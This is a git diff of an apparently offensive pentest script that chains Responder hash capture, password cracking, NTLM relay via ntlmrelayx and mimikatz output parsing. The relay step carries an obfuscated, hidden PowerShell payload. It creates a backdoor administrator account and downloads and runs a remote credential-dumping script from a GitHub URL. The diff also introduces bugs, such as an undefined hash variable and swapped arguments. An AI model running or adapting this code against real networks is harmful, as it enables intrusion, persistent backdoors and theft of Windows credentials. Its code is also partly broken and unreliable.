@@ -39,7 +39,10 @@ def parse_nmap(args):
     Will either return the parsed report or exit script
     '''
     if args.xml:
-        report = NmapParser.parse_fromfile(args.xml)
+        try:
+            report = NmapParser.parse_fromfile(args.xml)
+        except FileNotFoundError:
+            sys.exit('[-] Host file not found: {}'.format(args.xml))
     elif args.hostlist:
         hosts = []
         with open(args.hostlist, 'r') as hostlist:
@@ -595,7 +598,7 @@ def run_relay_attack():
                 ' -c "powershell -nop -exec bypass -w hidden -enc '
                 'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
     ntlmrelay_proc = run_proc(relay_cmd)
-    return ntlmrelay_proc
+    return resp_proc, ntlmrelay_proc
 
 def follow_file(thefile):
     '''
@@ -650,6 +653,7 @@ def format_mimi_data(dom, user, auth, hash_or_pw, prev_hashes, prev_pwds):
     else:
         if user_pw not in prev_hashes:
             prev_hashes.append(user_pw)
+            log_pwds({dom:[user_pw]})
             print('[!] {} found! {}'.format(hash_or_pw, user_pw))
 
     return prev_pwds, prev_hashes
@@ -724,9 +728,11 @@ def signal_handler(signal, frame):
     '''
     print('\n[-] CTRL-C caught, cleaning up and closing')
 
-    cleanup_resp()
-    pn = Popen("ps aux | grep -i 'ntlmrelayx.py -' | grep -v grep | awk '{print $2}' | xargs kill".split(), stdout=PIPE, stderr=PIPE, shell=True)
-    print(pn.communicate())
+    try:
+        cleanup_resp(resp_proc)
+        ntlmrelay_proc.kill()
+    except NameError:
+        pass
 
     # Cleanup hash files
     ntlm_files = []
@@ -739,23 +745,64 @@ def signal_handler(signal, frame):
             v1_file = open('NTLMv1-hashes.txt', 'a+')
             with open(fname) as infile1:
                 v1_file.write(infile1.read())
-                #os.remove(fname)
+                os.rename(fname, 'logs/'+fname)
         elif 'v2' in fname:
             with open(fname) as infile2:
                 v2_file = open('NTLMv2-hashes.txt', 'a+')
                 v2_file.write(infile2.read())
-                #os.remove(fname)
+                os.rename(fname, 'logs/'+fname)
     sys.exit()
 
-def cleanup_resp():
+def cleanup_resp(resp_proc):
     '''
     Kill responder and move the log file
     '''
-    p = Popen("ps aux | grep -i 'responder.py -' | grep -v grep | awk '{print $2}' | xargs kill -s SIGINT".split(),
-              stdout=PIPE, stderr=PIPE, shell=True)
+    resp_proc.kill()
     path = 'submodules/Responder/logs/Responder-Session.log'
     timestamp = str(time.time())
     os.rename(path, path+'-'+timestamp)
+    print('CLEANUP RESP WORKED') ########11111111111
+
+def do_ntlmrelay(prev_hashes, prev_pwds):
+    '''
+    Continuously monitor and parse ntlmrelay output
+    '''
+    print('[*] Attack 3: NTLM relay')
+    resp_proc, ntlmrelay_proc = run_relay_attack()
+
+    # CTRL-C handler
+    signal.signal(signal.SIGINT, signal_handler)
+
+    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
+    print('[*] ntlmrelayx.py output:')
+    ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
+    file_lines = follow_file(ntlmrelay_file)
+    successful_auth = False
+    for line in file_lines:
+
+        # check for errors
+        if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
+            # First few lines of mimikatz logo start with '   ' and have #### in them
+            if '####' not in line:
+                print(line.strip())
+
+        # ntlmrelayx output
+        if re.search('\[.\]', line):
+            print('    '+line.strip())
+        if successful_auth == False:
+            if ' SUCCEED' in line:
+                successful_auth = True
+        if successful_auth == True:
+            successful_auth = False
+            # NTLMv2
+            netntlm_hash = line.split()[-1]
+            if netntlm_hash.count(':') > 3:
+                if netntlm_hash not in prev_hashes:
+                    prev_hashes.append(ntlmv2_hash)
+
+        # Parse mimikatz
+        prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line)
+
 
 def main(report, args):
     '''
@@ -796,49 +843,17 @@ def main(report, args):
                 prev_hashes, prev_pwds, new_lines = get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines)
                 prev_lines += new_lines
         except KeyboardInterrupt:
-            pass
-        print('\n[-] Killing Responder.py and moving on')
-        cleanup_resp()
-        # Give responder some time to die
-        time.sleep(3)
+            print('\n[-] Killing Responder.py and moving on')
+            resp_proc.kill()
+            # Give responder some time to die
+            time.sleep(3)
 
     # ATTACK 3: NTLM relay
-    if 'relay' not in args.skip.lower():
-        if len(hosts) > 0:
-            print('[*] Attack 3: NTLM relay')
-            ntlmrelay_proc = run_relay_attack()
-        else:
-            sys.exit('[-] No SMB hosts to attack with ntlmrelay')
+    if 'relay' not in args.skip.lower() and len(hosts) > 0:
+        do_ntlmrelay(prev_pwds, prev_hashes)
+    elif len(hosts) == 0:
+        sys.exit('[-] No SMB hosts to attack with ntlmrelay')
 
-    # CTRL-C handler
-    signal.signal(signal.SIGINT, signal_handler)
-
-    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
-    while 1:
-        print('[*] ntlmrelayx.py output:')
-        ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
-        file_lines = follow_file(ntlmrelay_file)
-        for line in file_lines:
-
-            # check for errors
-            #error = check_ntlmrelay_error(line, file_lines)            mimikatz error
-            if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
-                # First few lines of mimikatz logo start with '   ' and have #### in them
-                if '####' not in line:
-                    print(line.strip())
-
-            # ntlmrelayx output
-            if re.search('\[.\]', line):
-                print('  '+line.strip())
-
-            # Find hashes
-            #version, ntlm_hash = get_ntlmrelay_hashes(line)
-            #if version != None:
-            #    pass
-                # PASS HASH INTO PREV_HASHES AND STUFF
-
-            # Parse mimikatz
-            prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line)
 
 if __name__ == "__main__":
     args = parse_args()
